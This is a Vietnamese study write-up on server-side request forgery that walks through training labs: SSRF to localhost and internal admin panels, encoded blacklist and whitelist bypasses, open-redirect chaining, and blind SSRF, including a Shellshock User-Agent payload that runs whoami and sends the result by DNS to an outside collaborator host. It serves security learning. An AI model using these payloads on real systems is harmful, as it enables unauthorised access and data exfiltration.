## SSRF là gì?

Server-side request forgery (SSRF) là một lỗ hổng bảo mật web cho phép kẻ tấn công khiến ứng dụng phía máy chủ gửi các yêu cầu đến một vị trí không được dự định.

Trong một cuộc tấn công SSRF điển hình, kẻ tấn công có thể khiến máy chủ thiết lập kết nối tới các dịch vụ chỉ tồn tại trong mạng nội bộ của tổ chức. Trong những trường hợp khác, chúng có thể buộc máy chủ kết nối tới các hệ thống bên ngoài bất kỳ. Điều này có thể làm rò rỉ dữ liệu nhạy cảm, chẳng hạn như các thông tin xác thực dùng để cấp quyền.

### Tác động của các cuộc tấn công SSRF là gì?

Một cuộc tấn công SSRF thành công thường có thể dẫn đến việc thực hiện các hành động trái phép hoặc truy cập trái phép vào dữ liệu bên trong tổ chức. Điều này có thể xảy ra trên chính ứng dụng chứa lỗ hổng hoặc trên các hệ thống back-end khác mà ứng dụng có khả năng giao tiếp.

Trong một số trường hợp, lỗ hổng SSRF còn có thể cho phép kẻ tấn công thực thi các lệnh tùy ý trên hệ thống.

Một khai thác SSRF khiến máy chủ kết nối tới các hệ thống bên ngoài của bên thứ ba có thể dẫn đến các cuộc tấn công tiếp diễn mang tính độc hại. Những cuộc tấn công này có thể trông như được khởi phát từ chính tổ chức đang vận hành ứng dụng có lỗ hổng, khiến nạn nhân hoặc hệ thống bên ngoài tin rằng các yêu cầu độc hại đến từ tổ chức đó chứ không phải từ kẻ tấn công.

### Các cuộc tấn công SSRF phổ biến

Các cuộc tấn công SSRF thường khai thác các mối quan hệ tin cậy để leo thang một cuộc tấn công từ ứng dụng có lỗ hổng và thực hiện các hành động trái phép. Các mối quan hệ tin cậy này có thể tồn tại liên quan đến chính máy chủ hoặc liên quan đến các hệ thống back-end khác trong cùng một tổ chức.

#### Các cuộc tấn công SSRF nhắm vào máy chủ

Kẻ tấn công khiến ứng dụng gửi một yêu cầu HTTP quay trở lại chính máy chủ đang lưu trữ ứng dụng, thông qua giao diện mạng loopback của nó. Điều này thường liên quan đến việc cung cấp một URL có hostname như 127.0.0.1 hoặc localhost

Ví dụ, hãy tưởng tượng một ứng dụng mua sắm cho phép người dùng xem liệu một mặt hàng có còn hàng tại một cửa hàng cụ thể hay không. Để cung cấp thông tin về hàng tồn kho, ứng dụng phải truy vấn nhiều REST API ở phía back-end. Ứng dụng thực hiện việc này bằng cách truyền URL của endpoint API back-end tương ứng thông qua một yêu cầu HTTP từ front-end. Khi người dùng xem trạng thái tồn kho của một mặt hàng, trình duyệt của họ gửi yêu cầu sau:

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```
Điều này khiến máy chủ gửi một yêu cầu đến URL đã chỉ định, lấy trạng thái tồn kho và trả kết quả đó cho người dùng.

Trong ví dụ này, kẻ tấn công có thể sửa đổi yêu cầu để chỉ định một URL cục bộ trên máy chủ:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```
Máy chủ lấy nội dung của URL /admin và trả nội dung đó cho người dùng.

Kẻ tấn công có thể truy cập URL /admin, nhưng chức năng quản trị thông thường chỉ có thể được truy cập bởi những người dùng đã được xác thực. Điều này có nghĩa là kẻ tấn công sẽ không nhìn thấy bất kỳ điều gì đáng quan tâm. Tuy nhiên, nếu yêu cầu đến URL /admin được gửi từ chính máy cục bộ, thì các cơ chế kiểm soát truy cập thông thường sẽ bị bỏ qua. Ứng dụng cấp toàn quyền truy cập vào chức năng quản trị, vì yêu cầu có vẻ như được gửi từ một vị trí đáng tin cậy.

Lab 1: Basic SSRF against the local server

![alt text](images/image.png)

Bắt request check stock và gửi đến Repeater

![alt text](images/image-1.png)

Thay đổi stockApi thành api `http://localhost/admin` để người dùng có quyền truy cập

![alt text](images/image-2.png)

Mở response trên và vào giao diện admin thao tác xóa người dùng carlos chưa xóa được nhưng lấy thành công api xóa carlos `/admin/delete?username=carlos`. Tiến hành sửa lại api xóa carlos ở check stock thì ta xóa thành công carlos

![alt text](images/image-3.png)
![alt text](images/image-4.png)

Tại sao các ứng dụng lại hoạt động theo cách này và ngầm tin tưởng các yêu cầu đến từ máy cục bộ? Điều này có thể xảy ra vì nhiều lý do:
- Việc kiểm tra kiểm soát truy cập có thể được triển khai trong một thành phần khác nằm phía trước máy chủ ứng dụng. Khi một kết nối được thực hiện quay trở lại máy chủ, bước kiểm tra này sẽ bị bỏ qua.
- Vì mục đích khôi phục sau thảm họa, ứng dụng có thể cho phép truy cập quản trị mà không cần đăng nhập đối với bất kỳ người dùng nào đến từ máy cục bộ. Điều này cung cấp một cách để quản trị viên khôi phục hệ thống nếu họ làm mất thông tin xác thực của mình. Điều này giả định rằng chỉ có người dùng hoàn toàn đáng tin cậy mới truy cập trực tiếp từ máy chủ.
- Giao diện quản trị có thể lắng nghe trên một số cổng khác với ứng dụng chính và có thể không thể được người dùng truy cập trực tiếp.

Những kiểu mối quan hệ tin cậy như vậy, trong đó các yêu cầu bắt nguồn từ máy cục bộ được xử lý khác với các yêu cầu thông thường, thường khiến SSRF trở thành một lỗ hổng có mức độ nghiêm trọng cao.

#### Các cuộc tấn công SSRF nhắm vào các hệ thống back-end khác

Trong một số trường hợp, máy chủ ứng dụng có thể tương tác với các hệ thống back-end mà người dùng không thể truy cập trực tiếp. Những hệ thống này thường có các địa chỉ IP riêng không thể định tuyến. Các hệ thống back-end thường được bảo vệ bởi cấu trúc mạng, vì vậy chúng thường có mức độ bảo mật thấp hơn. Trong nhiều trường hợp, các hệ thống back-end nội bộ chứa các chức năng nhạy cảm có thể được truy cập mà không cần xác thực bởi bất kỳ ai có khả năng tương tác với các hệ thống đó.

Trong ví dụ trước, hãy tưởng tượng có một giao diện quản trị tại URL back-end http://192.168.0.68/admin. Kẻ tấn công có thể gửi yêu cầu sau để khai thác lỗ hổng SSRF và truy cập vào giao diện quản trị:

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

Lab 2: Basic SSRF against another back-end system

![alt text](images/image-5.png)

Bắt request check stock gửi sang Repeater, sau đó đổi thành api `http://192.168.0.1:8080` rồi gửi tới Intruder. Sau đó thêm payload vào vị trí 1 rồi thực hiện bruteforce, ta tìm được giá trị 124

![alt text](images/image-6.png)

Sau đó sửa lại request bên Repeater và gửi thì ta thấy truy cập thành công vào trang admin, sửa lại thành api xóa carlos `http://192.168.0.124:8080/admin/delete?username=carlos` ta sẽ solve bài lab

![alt text](images/image-7.png)
![alt text](images/image-8.png)

### Vượt qua các cơ chế phòng vệ SSRF phổ biến

Thông thường, các ứng dụng có hành vi SSRF sẽ đi kèm với các cơ chế phòng vệ nhằm ngăn chặn việc khai thác độc hại. Tuy nhiên, trong nhiều trường hợp, các cơ chế phòng vệ này có thể bị vượt qua.

#### SSRF với bộ lọc đầu vào dựa trên blacklist

Một số ứng dụng chặn các đầu vào chứa hostname như 127.0.0.1 và localhost, hoặc các URL nhạy cảm như /admin. Trong tình huống này, có thể vượt qua bộ lọc bằng các kỹ thuật sau:
- Sử dụng một cách biểu diễn IP khác của 127.0.0.1, chẳng hạn như 2130706433, 017700000001, hoặc 127.1.
- Đăng ký tên miền của riêng bạn trỏ đến 127.0.0.1. Có thể sử dụng spoofed.burpcollaborator.net cho mục đích này.
- Làm rối các chuỗi bị chặn bằng cách sử dụng URL encoding hoặc thay đổi chữ hoa, chữ thường.
- Cung cấp một URL do bạn kiểm soát, URL này sẽ chuyển hướng đến URL mục tiêu. Hãy thử sử dụng các mã chuyển hướng khác nhau, cũng như các giao thức khác nhau cho URL đích. Ví dụ, việc chuyển từ URL http: sang https: trong quá trình chuyển hướng đã được chứng minh là có thể vượt qua một số bộ lọc chống SSRF.

Lab 3: SSRF with blacklist-based input filter

![alt text](images/image-9.png)

Gửi request check stock đến Repeater, sau đó thực hiện kiểm tra xem hostname nào bypass filter

![alt text](images/image-10.png)

Tiếp theo thử mã hóa api `/admin` để tiến hành bypass. Ta tiến hành encode 2 lần chữ a sau đó gửi request này

![alt text](images/image-11.png)

Tiến hành mở response này, sau đó sửa stockApi thành api xóa carlos

![alt text](images/image-12.png)
![alt text](images/image-13.png)

#### SSRF với bộ lọc đầu vào dựa trên whitelist

Một số ứng dụng chỉ cho phép các đầu vào khớp với một danh sách trắng các giá trị được phép. Bộ lọc có thể kiểm tra sự khớp ở phần đầu của đầu vào hoặc ở bất kỳ vị trí nào bên trong đầu vào. Bạn có thể vượt qua bộ lọc này bằng cách khai thác sự không nhất quán trong quá trình phân tích URL.

Đặc tả URL chứa một số đặc điểm mà rất có thể sẽ bị bỏ sót khi URL được phân tích và xác thực bằng các phương pháp tự triển khai:
- Có thể nhúng thông tin xác thực vào trong URL trước hostname bằng ký tự @. Ví dụ: `https://expected-host:fakepassword@evil-host`
- Có thể sử dụng ký tự # để chỉ định một URL fragment. Ví dụ: `https://evil-host#expected-host`
- Có thể tận dụng hệ thống phân cấp tên miền DNS để đặt chuỗi đầu vào bắt buộc vào một tên miền đầy đủ mà bạn kiểm soát. Ví dụ: `https://expected-host.evil-host`
- Có thể mã hóa URL các ký tự để làm rối mã phân tích URL. Điều này đặc biệt hữu ích nếu đoạn mã triển khai bộ lọc xử lý các ký tự đã được URL-encode khác với đoạn mã thực hiện yêu cầu HTTP ở phía back-end. Bạn cũng có thể thử mã hóa hai lần các ký tự; một số máy chủ sẽ giải mã URL đầu vào mà chúng nhận được theo cách đệ quy, điều này có thể dẫn đến nhiều sự khác biệt hơn nữa.

Lab 4: SSRF with whitelist-based input filter

![alt text](images/image-14.png)

Gửi request check stock tới Repeater, thử sửa stockApi thành `http://localhost` thì response yêu cầu `stock.weliketoshop.net`. Sửa api thành `http:localhost:80%2523@stock.weliketoshop.net` 80 là cổng http, %2523 mục tiêu là # (encode là %23 -> encode % thành %2523 để bypass filter)

![alt text](images/image-15.png)

Thử thêm endpoint `/admin` thấy server trả về status 200. Thực hiện thêm api xóa carlos để solve bài lab

![alt text](images/image-16.png)
![alt text](images/image-17.png)

#### Vượt qua bộ lọc SSRF thông qua lỗ hổng open redirection

Trong ví dụ trước, hãy tưởng tượng URL do người dùng cung cấp được kiểm tra rất nghiêm ngặt để ngăn chặn việc khai thác hành vi SSRF. Tuy nhiên, ứng dụng có các URL được phép lại chứa một lỗ hổng open redirection. Với điều kiện API được sử dụng để thực hiện yêu cầu HTTP ở phía back-end hỗ trợ việc chuyển hướng, bạn có thể tạo một URL vừa thỏa mãn bộ lọc vừa dẫn đến một yêu cầu được chuyển hướng đến mục tiêu back-end mong muốn.

Ví dụ, ứng dụng chứa một lỗ hổng open redirection, trong đó URL sau:
`/product/nextProduct?currentProductId=6&path=http://evil-user.net` sẽ trả về một chuyển hướng đến: `http://evil-user.net`

Bạn có thể tận dụng lỗ hổng open redirection để vượt qua bộ lọc URL và khai thác lỗ hổng SSRF như sau:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

Khai thác SSRF này hoạt động vì trước tiên ứng dụng kiểm tra rằng URL stockApi được cung cấp thuộc một miền được phép, và URL này thực sự thỏa mãn điều kiện đó. Sau đó, ứng dụng gửi yêu cầu đến URL đã cung cấp, điều này kích hoạt lỗ hổng open redirection. Ứng dụng sẽ theo chuyển hướng và gửi một yêu cầu đến URL nội bộ mà kẻ tấn công đã lựa chọn.

Lab 5: SSRF with filter bypass via open redirection vulnerability

![alt text](images/image-18.png)

Thử bấm next product, ta thu được api redirect

![alt text](images/image-19.png)

Copy api này và thay và stockApi, vì lab muốn yêu cầu truy cập vào trang admin `http://192.168.0.12:8080/admin` nên thay path thành trang của admin

![alt text](images/image-20.png)

Thực hiện truy cập vào api xóa carlos để solve bài lab

![alt text](images/image-21.png)
![alt text](images/image-22.png)

### Blind SSRF vulnerabilities

Lỗ hổng Blind SSRF xảy ra khi một ứng dụng có thể bị khiến gửi một yêu cầu HTTP ở phía back-end đến một URL được cung cấp, nhưng phản hồi từ yêu cầu back-end đó không được trả về trong phản hồi front-end của ứng dụng.

Tác động của các lỗ hổng Blind SSRF thường thấp hơn so với các lỗ hổng SSRF có phản hồi đầy đủ do tính chất một chiều của chúng. Chúng không thể bị khai thác một cách đơn giản để lấy dữ liệu nhạy cảm từ các hệ thống back-end, mặc dù trong một số trường hợp chúng có thể bị khai thác để thực hiện thực thi mã từ xa hoàn toàn

Cách tìm và khai thác các lỗ hổng Blind SSRF

Cách đáng tin cậy nhất để phát hiện các lỗ hổng Blind SSRF là sử dụng các kỹ thuật out-of-band (OAST). Điều này bao gồm việc cố gắng kích hoạt một yêu cầu HTTP đến một hệ thống bên ngoài do bạn kiểm soát và theo dõi các tương tác mạng với hệ thống đó.

Cách dễ nhất và hiệu quả nhất để sử dụng các kỹ thuật out-of-band là dùng Burp Collaborator. Bạn có thể sử dụng Burp Collaborator để tạo các tên miền duy nhất, gửi các tên miền này trong payload đến ứng dụng và theo dõi xem có bất kỳ tương tác nào với các tên miền đó hay không. Nếu quan sát thấy một yêu cầu HTTP đến từ ứng dụng gửi tới tên miền của bạn, thì ứng dụng đó có lỗ hổng SSRF.

Lab 6: Blind SSRF with out-of-band detection

![alt text](images/image-23.png)

Bắt request load trang sản phẩm và gửi đến Repeater

Tiến hành sửa request ở trường Referer thành OAST payload

![alt text](images/image-24.png)
![alt text](images/image-25.png)
![alt text](images/image-26.png)

Chỉ riêng việc xác định được một lỗ hổng Blind SSRF có khả năng kích hoạt các yêu cầu HTTP out-of-band tự nó vẫn chưa mang lại một cách khai thác. Vì bạn không thể xem phản hồi từ yêu cầu ở phía back-end, nên hành vi này không thể được sử dụng để khám phá nội dung trên các hệ thống mà máy chủ ứng dụng có thể truy cập.

Tuy nhiên, nó vẫn có thể được tận dụng để dò tìm các lỗ hổng khác trên chính máy chủ hoặc trên các hệ thống back-end khác. Bạn có thể âm thầm quét toàn bộ không gian địa chỉ IP nội bộ, gửi các payload được thiết kế để phát hiện những lỗ hổng đã được biết đến. Nếu các payload đó cũng sử dụng các kỹ thuật blind out-of-band, thì bạn có thể phát hiện một lỗ hổng nghiêm trọng trên một máy chủ nội bộ chưa được vá.

Lab 7: Blind SSRF with Shellshock exploitation

![alt text](images/image-27.png)

Bắt request trang xem sản phẩm và gửi đến Repeater.

Tại Referer sửa thành `http://192.168.0.1:8080` và User-Agent: `() { :; }; /usr/bin/nslookup $(whoami).hpaqnf1nymk8432mnfal6zx7gymqajy8.oastify.com`

Trong Shellshock, lỗ hổng xảy ra khi Bash đọc các biến môi trường mà CGI tạo từ các HTTP header. User-Agent là một header gần như luôn được CGI chuyển thành biến môi trường HTTP_USER_AGENT. Vì vậy, nếu chèn payload như () { :; }; /usr/bin/nslookup $(whoami).hpaqnf1nymk8432mnfal6zx7gymqajy8.oastify.com vào User-Agent, khi CGI khởi chạy Bash, Bash sẽ hiểu phần () { :; }; là định nghĩa hàm nhưng do lỗi Shellshock sẽ thực thi luôn lệnh nslookup. Lệnh này sẽ lấy kết quả của whoami rồi gửi một truy vấn DNS đến Burp Collaborator, giúp nhận được tên user hệ điều hành dù không nhìn thấy phản hồi trực tiếp

![alt text](images/image-28.png)

Gửi request này đến Intruder, thực hiện thêm payload vào vị trí X trong 192.168.0.X sau đó attack. Trong số 255 IP, chỉ một IP chạy CGI và dính Shellshock khi analytics gửi request đến đúng IP đó server nhận được `() { :; }; /usr/bin/nslookup $(whoami).hpaqnf1nymk8432mnfal6zx7gymqajy8.oastify.com`, bash thực thi. DNS query này được gửi trực tiếp từ máy chủ nội bộ đến Burp Collaborator.

![alt text](images/image-29.png)

Submit người dùng để solve bài lab

![alt text](images/image-30.png)

### Tìm bề mặt tấn công ẩn của các lỗ hổng SSRF

Nhiều lỗ hổng SSRF rất dễ phát hiện vì lưu lượng truy cập thông thường của ứng dụng có chứa các tham số request mang toàn bộ URL. Tuy nhiên, cũng có những trường hợp SSRF khác khó tìm hơn.

#### URL một phần trong request

Đôi khi, ứng dụng chỉ đặt hostname hoặc một phần của đường dẫn URL vào các tham số của request. Giá trị được gửi lên sau đó sẽ được phía máy chủ kết hợp thành một URL hoàn chỉnh để gửi yêu cầu.

Nếu giá trị này dễ dàng được nhận biết là một hostname hoặc một URL path thì bề mặt tấn công tiềm năng có thể khá rõ ràng. Tuy nhiên, khả năng khai thác thành SSRF hoàn chỉnh có thể bị hạn chế vì không kiểm soát được toàn bộ URL được yêu cầu.

#### URL bên trong các định dạng dữ liệu

Một số ứng dụng truyền dữ liệu theo các định dạng mà đặc tả của chúng cho phép chứa các URL, và các URL này có thể được trình phân tích của định dạng dữ liệu đó gửi yêu cầu.

Một ví dụ điển hình là định dạng dữ liệu XML, vốn đã được sử dụng rộng rãi trong các ứng dụng web để truyền dữ liệu có cấu trúc từ client đến server. Khi một ứng dụng chấp nhận dữ liệu ở định dạng XML và phân tích nó, ứng dụng có thể dễ bị XXE injection. Đồng thời, nó cũng có thể dễ bị SSRF thông qua XXE.

#### SSRF thông qua header Referer

Một số ứng dụng sử dụng phần mềm phân tích phía máy chủ để theo dõi khách truy cập. Phần mềm này thường ghi lại header Referer trong các request để theo dõi các liên kết dẫn đến.

Trong nhiều trường hợp, phần mềm phân tích này sẽ truy cập bất kỳ URL của bên thứ ba nào xuất hiện trong header Referer. Việc này thường được thực hiện để phân tích nội dung của các trang web giới thiệu, bao gồm cả văn bản neo được sử dụng trong các liên kết dẫn đến.